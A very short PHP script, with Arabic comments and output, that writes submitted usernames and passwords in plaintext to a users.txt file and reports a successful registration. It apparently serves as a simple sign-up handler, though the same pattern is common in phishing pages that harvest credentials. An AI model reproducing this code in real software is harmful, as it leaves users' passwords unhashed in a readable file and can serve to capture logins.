<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    $data = "Username: $username | Password: $password\n";
    
    // يفتح الملف وبيكتب عليه
    file_put_contents("users.txt", $data, FILE_APPEND);
    
    echo "تم التسجيل بنجاح!";
}
?>
